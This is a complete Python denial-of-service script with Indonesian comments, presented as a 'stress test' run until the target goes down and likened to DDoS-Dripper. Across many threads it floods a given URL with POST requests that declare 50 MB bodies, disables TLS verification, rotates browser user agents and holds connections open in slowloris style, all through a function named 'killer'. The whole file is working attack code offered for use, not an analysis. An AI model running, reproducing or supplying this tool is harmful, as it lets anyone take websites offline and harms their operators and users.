#!/usr/bin/env python3
"""
drip_max.py – high-impact stress-test sampai down (mirip DDos-Dripper)
usage: python3 drip_max.py https://yourdomain.com 2000 120
"""

import socket, ssl, threading, time, sys, random, dns.resolver
from urllib.parse import urlparse

def usage():
    print("Usage: python3 drip_max.py https://yourdomain.com 2000 120")
    sys.exit(1)

def resolve(host):
    try:
        return str(dns.resolver.resolve(host, 'A')[0])
    except Exception as e:
        print("[!] DNS gagal:", e)
        sys.exit(1)

def build_request(host, path):
    ua = random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
    ])
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 52428800\r\n"  # 50 MB
        f"Connection: keep-alive\r\n\r\n"
        + "x=" + "A" * 52428700  # 50 MB body
    ).encode()

def killer(url, threads, duration):
    parsed = urlparse(url)
    host   = parsed.netloc
    path   = parsed.path or "/"
    ip     = resolve(host)
    port   = 443 if url.startswith("https") else 80
    ssl_on = url.startswith("https")

    print(f"[+] Target : {host}:{port}{path}")
    print(f"[+] IP     : {ip}")
    print(f"[+] Threads: {threads}")
    print(f"[+] Duration: {duration}s")

    def flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(2)
                if ssl_on:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.connect((ip, port))
                sock.sendall(build_request(host, path))
                # Biarkan koneksi terbuka (slowloris-style)
                while True:
                    sock.send(b"X-a: b\r\n")
                    time.sleep(0.1)
            except:
                pass

    start = time.time()
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()

    while time.time() - start < duration:
        time.sleep(1)

    print("[+] Test selesai.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        usage()
    killer(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))